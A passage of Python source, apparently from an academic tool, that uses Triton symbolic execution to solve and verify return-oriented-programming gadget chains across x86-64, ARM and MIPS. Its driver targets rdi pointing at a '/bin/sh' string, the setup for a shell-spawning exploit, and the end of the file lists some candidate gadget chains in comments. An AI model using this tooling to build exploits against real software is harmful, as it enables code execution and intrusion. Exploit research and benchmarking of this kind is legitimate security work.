        process_value = eval(values)
        if process_value >> 32 == gadgets_info.regs_init.get('cs', 0):
            process_value = process_value&0xffffffff
        if "0x"+hex(process_value)[2:].zfill(_get_ac().addr_format_width) in gadgets_info.gadgets_dict:
            ctx.setConcreteMemoryAreaValue(controble_addr_base+addr_idx*_ptr_size(),_p(eval(values)&_addr_mask()))
        else:
            if check_address_rw(gadgets_info,process_value):
                ctx.setConcreteMemoryAreaValue(controble_addr_base+addr_idx*_ptr_size(),_p(eval(values)&_addr_mask()))
            else:
                if addr_idx == mem_dst_idx:
                    ctx.setConcreteMemoryAreaValue(controble_addr_base+addr_idx*_ptr_size(),_p(mem_dst_value&_addr_mask()))
                else:
                    memory_access = MemoryAccess(gadgets_info.controble_addr_base + _ptr_size() * addr_idx, _cpusize())
                    ctx.symbolizeMemory(memory_access, f"mem_{addr_idx}")
                    print(f"{addr_idx} {values}")
    address = 0x400000
    for c in stack_pivot_chain:
        codes = c.split(' -> ')[1].split(" ; ")
        for code in codes:
            
            _process_instruction_arm_safe(ctx, address, code)
            address += len(tools.my_asm(code))
    _reset_thumb(ctx)
    front_address = 0
    old_front_address = 0
    c = 0
    history_gadget = {}
    f = False
    while(1): 
        rip = ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().pc_reg))
        if _get_ac().bits == 64 and get_reg(ctx,'cs') is not None:
            if rip>>32 == ctx.getConcreteRegisterValue(get_reg(ctx,'cs')):
                rip = rip&0xffffffff
        if rip not in history_gadget:
            history_gadget[rip] = 1
        else:
            history_gadget[rip] += 1
        for g, n in history_gadget.items():
            if n>=20:
                f = True
                break
        if f:break
        if rip == front_address:
            c += 1
            if c >= 20:
                break
        else:
            old_front_address = front_address
            front_address = rip
        try:
            next_gadget = gadgets_info.gadgets_dict["0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width)]
        except:
            break
        address = rip
        if _get_ac().arch_name not in ('arm', 'armel', 'arm32'):
            next_gadget = next_gadget.replace("retf","ret")
        next_gadget = next_gadget.split(" ; ")
        for k in range(len(next_gadget)):
            if _get_ac().arch_name not in ('arm', 'armel', 'arm32'):
                if next_gadget[k].split(" ")[0] in ["ret","retf"]:
                    next_gadget[k] = "ret"
            instruction = None
            if not _skip_arm_imm_branch(ctx, address, next_gadget[k], k == len(next_gadget)-1):
                try:
                    instruction = Instruction(address, tools.my_asm_for_triton(next_gadget[k]))
                    ctx.processing(instruction)
                except:
                    if _get_ac().arch_name in ('arm', 'armel', 'arm32'):
                        op_info = tools.Analysis_op_dispatch(next_gadget[k])
                        n_pops = len(op_info) if type(op_info) == list else 1
                        sp_val = ctx.getConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg))
                        ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg), sp_val + n_pops * _ptr_size())
                    else:
                        return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
            _reset_thumb(ctx)
            if instruction is not None and instruction.isMemoryWrite():
                StoreAddress = instruction.getStoreAccess()[0][0].getAddress()
                logger.debug(f"Store Address {StoreAddress}")
                if StoreAddress != addr: # 当地址因寄存器的初始值或其他情况与预期不同时进行修正
                    change_mem_dst_value = (mem_dst_value - (StoreAddress - addr))&_addr_mask()
                    solve_res[mem_dst_idx] = hex(change_mem_dst_value)
                    NewMemoryAccess = MemoryAccess(StoreAddress, len(v))
                    for rr in range(len(address_list)):
                        if address_list[rr].getAddress() == addr:
                            address_list[rr] = NewMemoryAccess
                # ctx.processing(instruction)
            address += len(tools.my_asm(next_gadget[k]))
    ast = ctx.getAstContext()
    cons = []
    for r in range(len(target_reg_value)):
        for addr, v in target_reg_value[r].items(): 
            cons.append(ctx.getMemoryAst(address_list[r]) == int.from_bytes(v,'little'))
    if len(cons) > 1:
        con = ast.land(cons)
        solution = ctx.getModel(con)
    else:
        solution = ctx.getModel(cons[0])
    # print(solution)
    if len(solution) > 0:
        for k,v in solution.items():
            variables = str(v.getVariable()).split(':')[0].split("_")[1]
            value = v.getValue()
            solve_res[eval(variables)] = str(value)
        return solve_res
    else:
        return False
def check(gadgets_info,solve_res,stack_mem={}):
    logger.debug("Start Check Reg")
    ctx = _create_triton_ctx()
    if ctx is None:
        return False
    ctx = init_reg(ctx, gadgets_info.regs_init)
    for addr, values in stack_mem.items():
        ctx.setConcreteMemoryAreaValue(addr,_p(values['value']))
    controble_addr_base = gadgets_info.controble_addr_base
    stack_pivot_chain = gadgets_info.stack_pivot_chain
    target_reg_value = gadgets_info.target_regs
    for addr_idx, values in solve_res.items():
        ctx.setConcreteMemoryAreaValue(controble_addr_base+addr_idx*_ptr_size(),_p(eval(values)&_addr_mask()))
    address = 0x400000
    for c in stack_pivot_chain:
        codes = c.split(' -> ')[1].split(" ; ")
        for code in codes:
            _process_instruction_arm_safe(ctx, address, code)
            address += len(tools.my_asm(code))
    _reset_thumb(ctx)
    front_address = 0
    old_front_address = 0
    c = 0
    history_gadget = {}
    f = False
    while(1): 
        rip = ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().pc_reg))
        if _get_ac().bits == 64 and get_reg(ctx,'cs') is not None:
            if rip>>32 == ctx.getConcreteRegisterValue(get_reg(ctx,'cs')):
                rip = rip&0xffffffff
        if rip not in history_gadget:
            history_gadget[rip] = 1
        else:
            history_gadget[rip] += 1
        for g, n in history_gadget.items():
            if n >= 80:
                f = True
                break  
        if f: break     
        if rip == front_address:
            c += 1
            if c >= 80:
                break
        else:
            old_front_address = front_address
            front_address = rip
        try:
            next_gadget = gadgets_info.gadgets_dict["0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width)]
        except:
            break
        address = rip
        if _get_ac().arch_name not in ('arm', 'armel', 'arm32'):
            next_gadget = next_gadget.replace("retf","ret")
        next_gadget = next_gadget.split(" ; ")
        for k in range(len(next_gadget)):
            if _get_ac().arch_name not in ('arm', 'armel', 'arm32'):
                if next_gadget[k].split(" ")[0] in ["ret","retf"]:
                    next_gadget[k] = "ret"
            instruction = None
            if not _skip_arm_imm_branch(ctx, address, next_gadget[k], k == len(next_gadget)-1):
                try:
                    instruction = Instruction(address, tools.my_asm_for_triton(next_gadget[k]))
                    ctx.processing(instruction)
                except:
                    if _get_ac().arch_name in ('arm', 'armel', 'arm32'):
                        op0 = next_gadget[k].strip().split()[0]
                        if op0 in ('blx', 'bx'):
                            branch_reg = next_gadget[k].strip().split()[-1]
                            target_val = ctx.getConcreteRegisterValue(get_reg(ctx, branch_reg))
                            ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().pc_reg), target_val & ~1)
                            if op0 == 'blx':
                                ctx.setConcreteRegisterValue(get_reg(ctx, 'r14'), address + len(tools.my_asm(next_gadget[k])))
                        else:
                            _process_instruction_arm_safe(ctx, address, next_gadget[k])
                    else:
                        return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
            _reset_thumb(ctx)
            if instruction is not None and not read_write_check(instruction,gadgets_info.permission_table):
                # print("1")
                return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
            address += len(tools.my_asm(next_gadget[k]))
            if k != len(next_gadget)-1 and address != ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().pc_reg)):
                return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
        logger.debug(next_gadget)
        new_regs_state = {}
        for r,v in gadgets_info.regs_init.items():
            if r not in _get_ac().skip_regs:
                new_regs_state[r] = ctx.getConcreteRegisterValue(get_reg(ctx,r))
            else:
                new_regs_state[r] = v
        logger.debug(new_regs_state)
    if len(target_reg_value) == 1:
        target_reg = target_reg_value[0]['reg_name']
        target_value = target_reg_value[0]['reg_value']
        if type(target_value) == int:
            if target_value&_addr_mask() != ctx.getConcreteRegisterValue(get_reg(ctx, target_reg)):
                # print("3")
                return (False,"0x"+hex(old_front_address)[2:].zfill(_get_ac().addr_format_width))
        elif type(target_value) == dict:
            for addr, v in target_value.items():
                if ctx.getConcreteRegisterValue(get_reg(ctx, target_reg)) != eval(addr) or ctx.getConcreteMemoryAreaValue(eval(addr),8) != v:
                    # print("4")
                    return (False,"0x"+hex(old_front_address)[2:].zfill(_get_ac().addr_format_width))
    else:
        for i in range(len(target_reg_value)):
            target_reg = target_reg_value[i]['reg_name']
            target_value = target_reg_value[i]['reg_value']
            if type(target_value) == int:
                if target_value != ctx.getConcreteRegisterValue(get_reg(ctx, target_reg)):
                    # print("5")
                    return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
            elif type(target_value) == dict:
                for addr, v in target_value.items():
                    if ctx.getConcreteRegisterValue(get_reg(ctx, target_reg)) != eval(addr) or ctx.getConcreteMemoryAreaValue(eval(addr),8) != v:
                        # print("6")
                        return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
    return (True,None)
def parse_long_jmp(gadgets_info, solve_res):
    padding_map = {}
    gadgets_dict = gadgets_info.gadgets_dict
    padding_num = 0
    for idx, v in solve_res.items():
        addr = "0x"+hex((eval(v)&0xffffffff))[2:].zfill(_get_ac().addr_format_width)
        if addr in gadgets_dict:
            if padding_num != 0:
                padding_map[idx] = padding_num
                padding_num = 0
            g = gadgets_dict[addr]
            if "ret" in g or "retf" in g:
                last_op = g.split(" ; ")[-1]
                if len(last_op.split(" ")) != 1:
                    padding_num = eval(last_op.split(" ")[-1])
    return padding_map
def check_mem(gadgets_info,solve_res, stack_mem={}):
    logger.debug("Start Check Memory")
    # gadgets_info中的target只需要是{addr:value}
    ctx = _create_triton_ctx()
    if ctx is None:
        return False
    ctx = init_reg(ctx, gadgets_info.regs_init)
    for addr, values in stack_mem.items():
        ctx.setConcreteMemoryAreaValue(addr,_p(values['value']))
    controble_addr_base = gadgets_info.controble_addr_base
    stack_pivot_chain = gadgets_info.stack_pivot_chain
    target_reg_value = gadgets_info.target_mem_value
    for addr_idx, values in solve_res.items():
        ctx.setConcreteMemoryAreaValue(controble_addr_base+addr_idx*_ptr_size(),_p(eval(values)&_addr_mask()))
    address = 0x400000
    for c in stack_pivot_chain:
        codes = c.split(' -> ')[1].split(" ; ")
        for code in codes:
            _process_instruction_arm_safe(ctx, address, code)
            address += len(tools.my_asm(code))
    _reset_thumb(ctx)
    front_address = 0
    old_front_address = 0
    c = 0
    history_gadget = {}
    f = False
    while(1): 
        rip = ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().pc_reg))
        if _get_ac().bits == 64 and get_reg(ctx,'cs') is not None:
            if rip>>32 == ctx.getConcreteRegisterValue(get_reg(ctx,'cs')):
                rip = rip&0xffffffff
        if rip not in history_gadget:
            history_gadget[rip] = 1
        else:
            history_gadget[rip] += 1
        for g, n in history_gadget.items():
            if n >= 80:
                f = True
                break
        if f: break      
        if rip == front_address:
            c += 1
            if c >= 80:
                break
        else:
            old_front_address = front_address
            front_address = rip
        try:
            next_gadget = gadgets_info.gadgets_dict["0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width)]
        except:
            break
        address = rip
        if _get_ac().arch_name not in ('arm', 'armel', 'arm32'):
            next_gadget = next_gadget.replace("retf","ret")
        next_gadget = next_gadget.split(" ; ")
        for k in range(len(next_gadget)):
            if _get_ac().arch_name not in ('arm', 'armel', 'arm32'):
                if next_gadget[k].split(" ")[0] in ["ret","retf"]:
                    next_gadget[k] = "ret"
            instruction = None
            if not _skip_arm_imm_branch(ctx, address, next_gadget[k], k == len(next_gadget)-1):
                try:
                    instruction = Instruction(address, tools.my_asm_for_triton(next_gadget[k]))
                    ctx.processing(instruction)
                except:
                    if _get_ac().arch_name in ('arm', 'armel', 'arm32'):
                        op_info = tools.Analysis_op_dispatch(next_gadget[k])
                        n_pops = len(op_info) if type(op_info) == list else 1
                        sp_val = ctx.getConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg))
                        ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg), sp_val + n_pops * _ptr_size())
                    else:
                        return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
            _reset_thumb(ctx)

            if instruction is not None and not read_write_check(instruction,gadgets_info.permission_table):
                logger.debug("1")
                return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
            address += len(tools.my_asm(next_gadget[k]))
            if k != len(next_gadget)-1 and address != ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().pc_reg)):
                # print(f"address {hex(address)}")
                logger.debug(f"2")
                return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
        logger.debug(next_gadget)
        new_regs_state = {}
        for r,v in gadgets_info.regs_init.items():
            if r not in _get_ac().skip_regs:
                new_regs_state[r] = ctx.getConcreteRegisterValue(get_reg(ctx,r))
            else:
                new_regs_state[r] = v
        logger.debug(new_regs_state)
        for addr, v in target_reg_value[0].items():
            logger.debug(ctx.getConcreteMemoryAreaValue(addr,len(v)))
    for i in range(len(target_reg_value)):
        for addr, v in target_reg_value[i].items():
            if ctx.getConcreteMemoryAreaValue(addr,len(v)) != v:
                logger.debug("6")
                logger.debug(ctx.getConcreteMemoryAreaValue(addr,len(v)))
                return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width), ctx.getConcreteMemoryAreaValue(addr,8))
    return (True,None)
def get_regs_state(gadgets_info,solve_res, mode = 0):
    ctx = _create_triton_ctx()
    if ctx is None:
        return False
    ctx = init_reg(ctx, gadgets_info.regs_init)
    controble_addr_base = gadgets_info.controble_addr_base
    stack_pivot_chain = gadgets_info.stack_pivot_chain
    target_reg_value = gadgets_info.target_regs
    for addr_idx, values in solve_res.items():
        ctx.setConcreteMemoryAreaValue(controble_addr_base+addr_idx*_ptr_size(),_p(eval(values)&_addr_mask()))
    address = 0x400000
    for c in stack_pivot_chain:
        codes = c.split(' -> ')[1].split(" ; ")
        for code in codes:
            _process_instruction_arm_safe(ctx, address, code)
            address += len(tools.my_asm(code))
    _reset_thumb(ctx)
    front_address = 0
    old_front_address = 0
    c = 0
    while(1): 
        rip = ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().pc_reg))
        if _get_ac().bits == 64 and get_reg(ctx,'cs') is not None:
            if rip>>32 == ctx.getConcreteRegisterValue(get_reg(ctx,'cs')):
                rip = rip&0xffffffff
        if rip == front_address:
            c += 1
            if c >= 10:
                break
        else:
            old_front_address = front_address
            front_address = rip
        try:
            next_gadget = gadgets_info.gadgets_dict["0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width)]
        except:
            break
        address = rip
        if _get_ac().arch_name not in ('arm', 'armel', 'arm32'):
            next_gadget = next_gadget.replace("retf","ret")
        next_gadget = next_gadget.split(" ; ")
        # print(next_gadget)
        for k in range(len(next_gadget)):
            if _get_ac().arch_name not in ('arm', 'armel', 'arm32'):
                if next_gadget[k].split(" ")[0] in ["ret","retf"]:
                    next_gadget[k] = "ret"
            instruction = None
            if not _skip_arm_imm_branch(ctx, address, next_gadget[k], k == len(next_gadget)-1):
                try:
                    instruction = Instruction(address, tools.my_asm_for_triton(next_gadget[k]))
                    ctx.processing(instruction)
                except:
                    if _get_ac().arch_name in ('arm', 'armel', 'arm32'):
                        op0 = next_gadget[k].strip().split()[0]
                        if op0 in ('blx', 'bx'):
                            branch_reg = next_gadget[k].strip().split()[-1]
                            target_val = ctx.getConcreteRegisterValue(get_reg(ctx, branch_reg))
                            ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().pc_reg), target_val & ~1)
                            if op0 == 'blx':
                                ctx.setConcreteRegisterValue(get_reg(ctx, 'r14'), address + len(tools.my_asm(next_gadget[k])))
                        else:
                            _process_instruction_arm_safe(ctx, address, next_gadget[k])
                    else:
                        return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
            _reset_thumb(ctx)
            if instruction is not None and not read_write_check(instruction,gadgets_info.permission_table):
                logger.debug("read write error")
                return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
            address += len(tools.my_asm(next_gadget[k]))
            if k != len(next_gadget)-1 and address != ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().pc_reg)):
                # print(f"address {hex(address)}")
                # print(f"2")
                return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
    new_regs_state = {}
    for r,v in gadgets_info.regs_init.items():
        if mode == 0:
            if r not in _get_ac().skip_regs and r != _get_ac().sp_reg:
                new_regs_state[r] = ctx.getConcreteRegisterValue(get_reg(ctx,r))
            else:
                new_regs_state[r] = v
        elif mode == 1:
            if r not in _get_ac().skip_regs:
                new_regs_state[r] = ctx.getConcreteRegisterValue(get_reg(ctx,r))
            else:
                new_regs_state[r] = v
    return new_regs_state



class GadgetsInfo:
    def __init__(self,gadgets_file,regs_init,stack_pivot_chain,gadgets_dict,address_map,offset_list,controllable_mem_data,controble_addr_base,target_regs,target_mem_value,controllable_regs,permission_table,bss_address):
        ac = _get_ac()
        ptr_size = ac.ptr_size
        sp_reg = ac.sp_reg
        self.gadgets_file = gadgets_file
        self.regs_init = regs_init
        self.stack_pivot_chain = stack_pivot_chain
        self.gadgets_dict = gadgets_dict
        self.address_map = address_map
        self.offset_list = offset_list
        self.controble_addr_base = controble_addr_base
        self.controllable_mem_data = controllable_mem_data
        self.target_regs = target_regs
        self.target_mem_value = target_mem_value
        self.controllable_regs = controllable_regs
        self.solve_reg_constraints = {}
        self.permission_table = permission_table
        self.bss_address = bss_address
        only_pop_gadget = []
        self.bit_sub_gadgets = {}
        self.stack_mem = {}
        if "gadget.txt" in gadgets_file:
            stack_mem_path = gadgets_file.replace("gadget.txt","")+"stack_mem.json"
        else:
            stack_mem_path = '/home/rop/my-rop/src_v2/stack_pivot_vs_arc/info/stack_mem.json'
        self.after_mem_set_reg = None
        if os.path.isfile(stack_mem_path):
            with open(stack_mem_path, 'r', encoding='utf-8') as json_file:
                stack_mem = json.load(json_file)
            trans_stack_mem = {}
            for i, v in stack_mem.items():
                trans_stack_mem[eval(i)] = {"value":eval(v),"length":ptr_size}
            self.stack_mem = trans_stack_mem

        # Use architecture-dispatching analysis functions
        _Analysis_gadget = tools.Analysis_gadget_dispatch
        _Analysis_op = tools.Analysis_op_dispatch

        for addr, gadget in gadgets_dict.items():
            if ac.arch_name in ('x86_64','amd64','x86-64'):
                if len(gadget.split(" ; ")) == 2 and "ret" in gadget.split(" ; ")[-1]:
                    g_info = _Analysis_op(gadget.split(" ; ")[0])
                    if g_info and type(g_info)!=list:
                        if g_info['op'] == "mov" and g_info['src']['type'] == "num" and g_info['dst']['type'] == 'value' and g_info['dst']['bit'] == 32:
                            reg = g_info['dst']['reg_name']
                            if reg not in self.bit_sub_gadgets:
                                self.bit_sub_gadgets[reg] = addr
                # x86 pop gadgets
                if gadget.count("pop ") == len(gadget.split(" ; "))-1 and gadget.count("pop ")!=0:
                    pop_regs = []
                    gadget_s = gadget.split(" ; ")
                    if gadget_s[-1] not in ["ret","retf"]:
                        continue
                    for i in range(len(gadget_s)-1):
                        r = gadget_s[i].split(" ")
                        if len(r) != 2:
                            break
                        r = r[-1]
                        if "[" in r or "]" in r:
                            break
                        pop_regs.append(r)
                    if gadget.count("pop ") == len(pop_regs) and sp_reg not in pop_regs:
                        only_pop_gadget.append({"addr":addr,"pop_regs":pop_regs})
            elif ac.arch_name in ('arm','armel','arm32'):
                # ARM pop {r0, r1, ..., pc} gadgets
                last = gadget.split(" ; ")[-1].strip()
                if 'pop' in last and 'pc' in last:
                    reg_list_str = last.replace('pop','').strip().strip('{}')
                    pop_regs = [r.strip() for r in reg_list_str.split(",") if r.strip() != 'pc']
                    if sp_reg not in pop_regs:
                        only_pop_gadget.append({"addr":addr,"pop_regs":pop_regs})
            elif ac.arch_name in ('mips','mipsel','mips32'):
                # MIPS: lw $ra, offset($sp) ; ... ; jr $ra pattern
                gadget_parts = gadget.split(" ; ")
                last = gadget_parts[-1].strip()
                if last.startswith('jr') and '$ra' in last:
                    pop_regs = []
                    for part in gadget_parts[:-1]:
                        part = part.strip()
                        if part.startswith('lw'):
                            operands = part[2:].strip()
                            if ',' in operands:
                                dst_reg = operands[:operands.index(',')].strip()
                                if dst_reg != '$ra' and dst_reg != sp_reg:
                                    pop_regs.append(dst_reg)
                    if len(pop_regs) > 0 and sp_reg not in pop_regs:
                        only_pop_gadget.append({"addr":addr,"pop_regs":pop_regs})

        self.only_pop_gadget = only_pop_gadget
        change_sp_gadget = []
        self.ret_gadget = None
        self._ret_gadget_score = (999, 999)
        self.syscall_gadget = None

        for addr, gadget in gadgets_dict.items():
            if ac.arch_name in ('x86_64','amd64','x86-64'):
                if gadget == "ret":
                    change_sp_gadget.append({'addr':addr,'gadget':gadget,'change':ptr_size,'side_affect':[]})
                    self.ret_gadget = {'addr':addr,'gadget':gadget,'change':ptr_size,'side_affect':[]}
                if gadget == "syscall ; ret":
                    self.syscall_gadget = addr
            elif ac.arch_name in ('arm','armel','arm32'):
                stripped = gadget.strip()
                if stripped.startswith('pop') and 'pc' in stripped and ' ; ' not in gadget:
                    reg_list = stripped.replace('pop','').strip().strip('{}')
                    regs = [r.strip() for r in reg_list.split(',')]
                    reg_count = len(regs)
                    side = [r for r in regs if r != 'pc']
                    target_names = [t['reg_name'] for t in target_regs]
                    target_overlap = len([r for r in side if r in target_names])
                    score = (target_overlap, reg_count)
                    if self.ret_gadget is None or score < self._ret_gadget_score:
                        self._ret_gadget_score = score
                        self.ret_gadget = {'addr':addr,'gadget':gadget,'change':ptr_size*reg_count,'side_affect':side}
                    change_sp_gadget.append({'addr':addr,'gadget':gadget,'change':ptr_size*reg_count,'side_affect':side})
                if 'svc' in gadget and ('pop' in gadget and 'pc' in gadget):
                    self.syscall_gadget = addr
            elif ac.arch_name in ('mips','mipsel','mips32'):
                if gadget.strip() == "jr $ra":
                    change_sp_gadget.append({'addr':addr,'gadget':gadget,'change':ptr_size,'side_affect':[]})
                    self.ret_gadget = {'addr':addr,'gadget':gadget,'change':ptr_size,'side_affect':[]}
                if 'syscall' in gadget and 'jr $ra' in gadget:
                    self.syscall_gadget = addr

            gadget_info = _Analysis_gadget(gadget)
            if gadget_info:
                for hij in range(len(gadget_info['hijack_reg'])):
                    if gadget_info['hijack_reg'][hij]['reg_name'] == sp_reg and gadget_info['hijack_reg'][hij]['type'] == "mem_value":
                        first_gadget = _Analysis_gadget(gadget.split(" ; ")[0])
                        if not first_gadget:
                            continue
                        for i0 in range(len(first_gadget['can_change_regs'])):
                            if first_gadget['can_change_regs'][i0]['reg_name'] == sp_reg and first_gadget['can_change_regs'][i0]['bit'] >= ac.bits//2 and (first_gadget['can_change_regs'][i0]['src_reg_type'] == 'num' or (first_gadget['can_change_regs'][i0]['src_reg_type'] == 'value' and first_gadget['can_change_regs'][i0]['src_reg'] == sp_reg)):
                                change_expr = 0
                                pop_change = 0
                                for i1 in range(len(gadget.split(" ; "))-1):
                                    op_info = _Analysis_op(gadget.split(" ; ")[i1])
                                    if op_info == None:
                                        break
                                    if type(op_info) == list:
                                        continue
                                    if op_info['op'] in ['add','sub','addiu'] and op_info['dst']['reg_name'] == sp_reg and op_info['dst']['type'] == 'value' and op_info['src']['type'] == 'num':
                                        symbol = '+' if op_info['op'] in ('add','addiu') else '-'
                                        change_expr = change_expr + eval(f"{symbol} {op_info['src']['value']}")
                                    if op_info['op'] == 'pop':
                                        pop_change += ptr_size
                                    if op_info['op'] == 'push':
                                        pop_change -= ptr_size
                                    if ac.arch_name in ('x86_64','amd64','x86-64') and op_info['op'] == 'lea':
                                        try:
                                            change_expr = change_expr + eval(op_info['src']['expr'][4:])
                                        except:
                                            change_expr = 0
                                            break
                                if change_expr != 0:
                                    change_expr += pop_change
                                    side_affect = []
                                    for s in range(len(gadget_info['can_change_regs'])):
                                        if gadget_info['can_change_regs'][s]['reg_name'] == sp_reg and gadget_info['can_change_regs'][s]['src_reg'] == 'immediate_num':
                                            continue
                                        else:
                                            side_affect.append(gadget_info['can_change_regs'][s]['reg_name'])
                                    change_sp_gadget.append({'addr':addr,'gadget':gadget,'change':change_expr+ptr_size,'side_affect':side_affect})

        for j in range(len(only_pop_gadget)):
            pop_change_esp = {'addr':only_pop_gadget[j]['addr'],'gadget':gadgets_dict[only_pop_gadget[j]['addr']],'change':ptr_size*len(only_pop_gadget[j]['pop_regs'])+ptr_size,'side_affect':only_pop_gadget[j]['pop_regs']}
            change_sp_gadget.append(pop_change_esp)
        self.change_sp_gadget = sorted(change_sp_gadget, key=lambda x: (x['change'],len(x['side_affect'])))
        self.my_virtual_mem_info = (ac.virtual_mem_base, ac.virtual_mem_size)
        self.used_virtual_mem = {}
        self.permission_table.append({"start":self.my_virtual_mem_info[0],"end":self.my_virtual_mem_info[0]+self.my_virtual_mem_info[1],"permission":"rw"})


            

def main():
    gadgets_file = "/home/rop/my-rop/experiment/ccb-2024-final-NFS-Heap/gadget.txt"
    gadgets_data = tools.load_gadget(gadgets_file)
    gadgets_dict = tools.create_gadget_dict(gadgets_data)
    
    controllable_mem_file_dir = '/home/rop/my-rop/benchmark_experiment/benchmark_mem_reg_info_fold/gcc_fzero/libjson-c.so.5.3.0/cyclic_matches.json'
    with open(controllable_mem_file_dir, "r", encoding="utf-8") as file:
        controllable_mem_data = json.load(file)
    controllable_mem_data = sorted(controllable_mem_data, key=lambda x: int(x['start_addr'], 16))
    controble_addr_base = int(controllable_mem_data[0]['start_addr'],16)
    # print(f"controble_addr_base: {hex(controble_addr_base)}")
    (permission_table, regs_init) = tools.get_map_regs("/home/rop/my-rop/benchmark_experiment/benchmark_mem_reg_info_fold/gcc_fzero/libjson-c.so.5.3.0")
    controllable_regs = eval(open("/home/rop/my-rop/benchmark_experiment/benchmark_mem_reg_info_fold/gcc_fzero/libjson-c.so.5.3.0/controble_regs.txt",'r').read())
    binary_file = '/home/rop/my-rop/benchmark_experiment/rop-benchmark/binaries/x86/reallife/vuln/gcc_fzero/libjson-c.so.5.3.0.bin'
    elf = ELF(binary_file,checksec=False)  # 加载目标二进制
    bss_address = elf.bss()  # 获取 .bss 段地址
    
    stack_pivot_chain = ['0x10000 -> ret']
    offset_list = [_ for _ in range(1000)]
    rsp_idx = (regs_init[_get_ac().sp_reg] - controble_addr_base)//_ptr_size()
    offset_list.pop(0)
    offset_list.pop(0)
    offset_list.pop(0)
    address_map = {rsp_idx:"0xdeadbeef"}
    offset_list.pop(offset_list.index(rsp_idx))
    # ['rax','rbx','rcx','rdx','rdi','rsi','r8','r9','r10','r11','r12','r13','r14','r15','rbp']
    # reg_name = ['rax','rbx','rcx','rdx','rdi','rsi','r8','r9','r10','r11','r12','r13','r14','r15','rbp']
    target_regs = [{'reg_name':'rdi','reg_value':0x400000}]
    target_mem_value = [{0x400000:b"/bin/sh\x00"}]
    # valid_gadget_seqs = eval(open("/home/angr/angrop/my-rop/src/find_reg_gadget_chain.txt").read().split("\n")[0])

    # to_be_solved_list = []
    # for i in range(len(valid_gadget_seqs)):
    #     for j in range(len(valid_gadget_seqs[i])):
    #         # print("****************************************************")
    #         tmp = []
    #         for k in range(len(valid_gadget_seqs[i][j])):
    #             # print("-------------------------------------------------------")
    #             for l in range(len(valid_gadget_seqs[i][j][k])):
    #                 # print(gadgets_dict[valid_gadget_seqs[i][j][k][l]])
    #                 # tmp.append(gadgets_dict[valid_gadget_seqs[i][j][k][l]])
    #                 tmp.append(valid_gadget_seqs[i][j][k][l])
    #         to_be_solved_list.append(tmp)
    # print(to_be_solved_list)
    to_be_solved_list = [[['0x0000000000050010', '0x0000000000050000']]]
    for i0 in range(len(to_be_solved_list)):
        gadget_chain = to_be_solved_list[i0]
        gadgets_info = GadgetsInfo(gadgets_file,regs_init,stack_pivot_chain,gadgets_dict,address_map,offset_list,controllable_mem_data,controble_addr_base,target_regs,target_mem_value,controllable_regs,permission_table,bss_address)
        solve_res = solve(gadget_chain,gadgets_info)
        if not solve_res:
            print(f"{i0} False")
            continue
        else:
            print(f"{i0} True")
            print(solve_res)
            print(check(gadgets_info=gadgets_info,solve_res=solve_res))
        exit()
            # for n in range(len(gadget_chain)):
            #     print(f"{gadgets_dict[gadget_chain[n]]}")
            
    # -------------------------------------------------------
    # pop rbx ; retf
    # pop rbp ; ret
    # xchg ebx, eax ; push rbp ; ret
    # imul edi, esp, -1 ; call qword ptr [rax + 0x4855c3c9]
    # -------------------------------------------------------
    # pop rbx ; retf
    # pop rbp ; ret
    # xchg ebx, eax ; push rbp ; ret
    # pop rsi ; sub bh, bh ; call rax
    # -------------------------------------------------------
    # pop rbx ; retf
    # pop rbp ; ret
    # xchg ebx, eax ; push rbp ; ret
    # pop rcx ; retf
    # xchg edx, eax ; mov dh, 0xfe ; call qword ptr [rcx + 1]
    # -------------------------------------------------------
    # pop rbx ; retf
    # pop rbp ; ret
    # xchg ebx, eax ; push rbp ; ret
    
if __name__ == "__main__":
    main()